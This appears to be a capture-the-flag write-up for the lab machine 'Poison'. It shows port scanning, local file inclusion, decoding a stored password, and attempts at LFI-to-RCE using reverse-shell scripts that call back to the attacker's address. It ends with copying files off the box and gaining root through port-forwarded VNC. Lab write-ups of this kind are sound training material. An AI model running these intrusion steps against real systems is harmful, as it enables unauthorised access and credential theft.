---
layout: post
title: "poison"
date: 2025-08-31 
categories: OSCP Playlist
---
# poison

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV 10.10.10.84 -oN nmap/poison

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Let’s visit the web page.

![image.png]({{ site.baseurl }}/assets/poison/image.png)

It seems we can input file name and the server will retrieve back the file from the backend. Let’s see if we can retrieve arbitrary files:

![image.png]({{ site.baseurl }}/assets/poison/image%201.png)

![image.png]({{ site.baseurl }}/assets/poison/image%202.png)

It seems we can.

From info.php, we get OS version

```bash
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
```

Also, one of the options of php scripts are llistfiles.php, let’s see what the file contains:

```bash
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```

Seems like there is a pwdbackup.txt. Input it:

```bash
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
```

It’s encoded 13 times. Looks like a base64 encoding. We go on cyberchef base64 decode the string 13 times, we get this password:

```bash
Charix!2#4%6&8(0
```

From before outputting the /etc/passwd file, we see there is a user charix, so this password is probably related to that user.

There is another method of getting a shell on the machine. 

From phpinfo.php, we see that file uploads are on:

![image.png]({{ site.baseurl }}/assets/poison/image%203.png)

Searching LFI phpinfo, we come across “The Hacker Recipes”: https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/phpinfo
When `file_uploads=on` is set in the PHP configuration file, it is possible to upload a file by POSTing it on any PHP file ([RFC1867](https://www.ietf.org/rfc/rfc1867.txt)). This file is put to a temporary location on the server and deleted after the HTTP request is fully processed.
The aim of the attack is to POST a PHP reverse shell on the server and delay the processing of the request by adding very long headers to it. This gives enough time to find out the temporary location of the reverse shell using the output of the `phpinfo()` function and including it via the LFI before it gets removed.

The poc script linked from the blog is here:

[https://github.com/roughiz/lfito_rce](https://github.com/roughiz/lfito_rce)

Let’s download that and try it out:

```bash
python lfito_rce.py -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001  -t 12  -i "http://host:8080/phpinfo.php"

python lfito_rce.py -l "http://10.10.10.84/browse.php?file=" --lhost 10.10.16.5 --lport 9001  -t 12  -i "http://10.10.10.84/phpinfo.php"

python lfito_rce.py -a 2 -l "http://10.10.10.84/browse.php?file=" --lhost 10.10.16.5 --lport 9001
```

Did not work. Let’s try another script from paylodsallthethings:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/phpinfolfi.py

Swap the payload inside to php reverse shell from pentest monkey, the payload have to be between the two \r 

Swap the LFIREQ to:

```bash
"""GET /browse.php?file=%s HTTP/1.1\r
```

Now execute it:

```bash
python phpinfolfi.py 10.10.10.84 80 100
```

Does not work… 

Another method to get RCE is through log poisoning. Let’s first search up where the log is on Google: apache log freebsd; we get */var/log/httpd-access.log*

```bash
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
```

We get an error parsing and the file is too big to use php filter to base64 encode. Let’s move on…

Let’s ssh to the target:

```bash
ssh charix@10.10.10.84 #Charix!2#4%6&8(0
```

We see a secret.zip on the box. However, unzipping does not seem to be working, as the file requires a password, but the password prompt is not popping up. 7z is also not on the box. Let’s transfer the file back to our host and unzip it:

```bash
scp charix@10.10.10.84:secret.zip .
```

Let’s use the same password for charix for secret.zip

Once extracted, there is only one file, named secret:

```bash
xxd secret

00000000: bda8 5b7c d596 7a21                      ..[|..z!

```

Not much. Let’s go back on the target.

No sudo on box, not in a privileged group. No ifconfig command. No ss. Let’s try netstat:

```bash
netstat -an | grep LIST

Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.16.5.46564       ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*                    
udp6       0      0 *.514                  *.*                    

```

Let’s reconnect with ssh local port forwarding 5801 and 5901 to our host:

```bash
ssh charix@10.10.10.84 -L 5801:localhost:5801 -L 5901:localhost:5901
```

port 5801:

![image.png]({{ site.baseurl }}/assets/poison/image%204.png)

port 5901:

![image.png]({{ site.baseurl }}/assets/poison/image%205.png)

Searching this up, we find out this is to do with VNC (VNC (Virtual Network Computing) is a remote desktop sharing system that allows you to remotely control another computer over a network, using your keyboard and mouse as if you were physically there).

Let’s use vncviewer:

```bash
vncviewer -passwd secret localhost:5901
```

Now we have root.